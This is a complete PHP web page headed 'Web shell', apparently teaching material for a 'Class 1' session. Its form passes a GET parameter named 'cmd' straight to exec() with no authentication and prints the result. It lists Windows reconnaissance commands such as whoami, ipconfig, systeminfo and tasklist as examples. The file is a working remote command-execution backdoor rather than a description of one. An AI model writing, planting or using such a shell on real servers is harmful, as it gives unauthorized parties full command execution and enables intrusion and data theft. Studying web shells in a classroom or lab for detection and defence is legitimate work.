<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command System - Class 1 Teaser</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .form-group {
            margin: 20px 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .output {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            white-space: pre-wrap;
            font-family: monospace;
        }
        .examples {
            background-color: #e7f3ff;
            border: 1px solid #b8daff;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .examples h3 {
            margin-top: 0;
            color: #004085;
        }
        .examples ul {
            margin: 10px 0;
        }
        .examples li {
            margin: 5px 0;
        }
        .examples code {
            background-color: #f8f9fa;
            padding: 2px 5px;
            border-radius: 3px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1> Web shell </h1>


        <form method="GET" action="">
            <div class="form-group">
                <label for="cmd">Enter a command to execute:</label>
                <input type="text" id="cmd" name="cmd" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" placeholder="Ex: dir, whoami, ipconfig">
            </div>
            <button type="submit">Execute Command</button>
        </form>

        <?php
        if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
            echo '<div class="output">';
            echo '<strong>Executed command:</strong> ' . htmlspecialchars($_GET['cmd']) . "\n\n";
            echo '<strong>Result:</strong>' . "\n";
            
            exec($_GET['cmd'], $output, $return_code);
            
            if (!empty($output)) {
                foreach($output as $line) {
                    echo htmlspecialchars($line) . "\n";
                }
            } else {
                echo "Command executed. Return code: " . $return_code;
            }
            echo '</div>';
        }
        ?>

        <div class="examples">
            <h3> Command Examples (Windows):</h3>
            <ul>
                <li><code>dir</code> - List files and folders</li>
                <li><code>whoami</code> - Show current user</li>
                <li><code>ipconfig</code> - Show network configuration</li>
                <li><code>systeminfo</code> - System information</li>
                <li><code>tasklist</code> - List running processes</li>
                <li><code>echo "Hello World"</code> - Display a message</li>
            </ul>
            
        </div>

    </div>
</body>
</html>
